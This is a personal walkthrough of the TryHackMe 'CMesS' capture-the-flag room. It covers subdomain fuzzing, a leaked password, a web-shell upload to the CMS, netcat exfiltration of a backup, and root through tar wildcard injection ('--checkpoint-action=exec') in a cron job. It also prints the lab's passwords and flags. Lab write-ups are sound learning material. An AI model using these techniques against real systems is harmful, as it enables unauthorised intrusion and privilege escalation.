# CMesS

"Can you root this Gila CMS box?"

An important instruction was to specify `cmess.thm` as a host entry for the machine IP. This perhaps was a hint to the first way in.

1. Recon showed just 22 and 80. I ran dirb, nikto and got a huge number of false positives, but no way in. The CMS, gila, had a couple of vulns but they all required access.

2. On the TryHackMe page the 'user flag' question has a hint, "Have you tried fuzzing subdomains?". I hadn't, and indeed haven't before. I figured I would try with wfuzz.

    The problem with subdomains is that in order to use them, I need to specify the host entry for them. With all but a very minimal set, that would be hundreds of entries: I can't just `wfuzz http://FUZZ.cmess.thm` for example. However, a host entry is equivalent to going to an IP and specifying a Host header, so this works:

    `wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -H "Host: FUZZ.cmess.thm" 10.10.25.158`

    Running this, I got 200 ok codes for almost every entry. However, I was able to tell a difference via size:

    ```
    ...
    000000058:   200        107 L    290 W    3907 Ch     "announcements"
    000000178:   200        107 L    290 W    3874 Ch     "cm"
    000000190:   200        107 L    290 W    3898 Ch     "compressed"
    000000256:   200        30 L     104 W    934 Ch      "dev"
    000000196:   200        107 L    290 W    3895 Ch     "configure"
    000000204:   200        107 L    290 W    3889 Ch     "content"
    000000215:   200        107 L    290 W    3886 Ch     "cpanel"
    000000228:   200        107 L    290 W    3877 Ch     "cvs"
    ...
    ```

3. Setting up a host entry (could have also used curl with an explicit header) for `dev.cmess.thm`, going there returned a chat log:

    ```
    Development Log
    andre@cmess.thm

    Have you guys fixed the bug that was found on live?
    support@cmess.thm

    Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
    support@cmess.thm

    Update! We have had to delay the patch due to unforeseen circumstances
    andre@cmess.thm

    That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
    support@cmess.thm

    Your password has been reset. Here: KPFTN_f2yxe%
    ```

4. I was able to log in with `andre@cmess.thm` and `KPFTN_f2yxe%` via `/login` and got access to the admin panel.

5. Using the file manager, I was able to see the content of config.php, which included the db creds:

    ```
     array (
        'host' => 'localhost',
        'user' => 'root',
        'pass' => 'r0otus3rpassw0rd',
        'name' => 'gila',
    ),
    ```

    (this turned out to be useless as the only user in the db was one I already had and mysql wasn't running with suid or sudo)

6. I was also able to use the file manager to upload a web shell to the `/assets` dir (I used [p0wny shell](https://github.com/flozz/p0wny-shell)). I'm guessing this was the 'misconfigured htaccess' from the dev log, as the other directories have access files that prevent php from running but not assets (its .htaccess is blank). From this I discovered the following:

    - I was operating as `www-data`
    - There was nothing interesting in the website folders (which were `/var/www/html` and `/var/www/dev`)
    - The one home folder, `andre`, I couldn't access
    - `www-data` didn't have `sudo -l` access (at least without a password)
    - No obvious SUID executables
    - A *very* suspicious `andre_backup.tar.gz` existed under `/tmp`

7. I used a `nc listener` and `cat | nc` on the backup to get it back to my host for analysis. Probably unnecessary since it was in `tmp` - could have done this in place. After extracting it `gunzip out.tar.gz` followed by `tar -xvf out.tar` it contained `note`, whose content was:

    ```
    Note to self.
    Anything in here will be backed up!
    ```

    Interesting.

8. I catted /etc/crontab and found:

    ```
    */2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
    ```

    So this is possibly a path to root once I have control of that backup folder (and looks like an exploit of tar wildcard expansion, which I used in the `skynet` room)

9. I grabbed linpeas and ran it, and it identified under writable files a suspicious-looking file `/opt/.password.bak`. Catting that gave me:

    ```
    andres backup password
    UQfsdCB7aAP6
    ```

10. With this I ssh'ed in (dropping my reverse shells) and got the user flag, yus: `thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}`

11. I went into the backup folder, and used nano to put the same reverse shell line I had used before into a file called `shell.sh`. Then I created two more files with touch:

    ```
    touch ./--checkpoint=1
    touch ./--checkpoint-action=exec=sh\ shell.sh
    ```

12. Exiting ssh and starting a nc reverse listener, I waited. Momentarily I got my shell popped with root :) The final flag, under `/root/root.txt` was `thm{9f85b7fdeb2cf96985bf5761a93546a2}`